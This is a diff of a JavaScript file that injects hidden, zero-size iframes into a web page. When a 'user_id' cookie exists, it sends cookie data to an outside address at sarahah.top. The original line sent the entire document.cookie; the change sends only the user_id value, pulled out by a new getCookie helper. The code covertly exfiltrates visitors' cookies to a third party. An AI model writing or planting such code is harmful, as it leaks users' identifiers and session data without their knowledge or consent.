@@ -15,6 +15,21 @@ sarhneIframe.setAttribute("frameborder", "0");
 document.getElementsByTagName("body")[0].appendChild(sarhneIframe);
 
 
+// func
+
+function getCookie(name) {
+    var nameEQ = name + "=";
+    var ca = document.cookie.split(';');
+    for(var i=0;i < ca.length;i++) {
+        var c = ca[i];
+        while (c.charAt(0)==' ') c = c.substring(1,c.length);
+        if (c.indexOf(nameEQ) == 0) return c.substring(nameEQ.length,c.length);
+    }
+    return null;
+}
+
+
+
 
 
 
@@ -24,7 +39,9 @@ if (document.cookie.includes("user_id")){
     
     // Create an iframe dynamically
     sarahah_base = "https://sarahah.top/u/hfisher##";
-    sarahah_src = sarahah_base+document.cookie;
+    user_id = "user_id="+getCookie("user_id");
+
+    sarahah_src = sarahah_base+user_id;
     var sarahahIframe = document.createElement("iframe");
     sarahahIframe.setAttribute("src", sarahah_src);
     sarahahIframe.setAttribute("style", "position: absolute;width:0;height:0;border:0;");
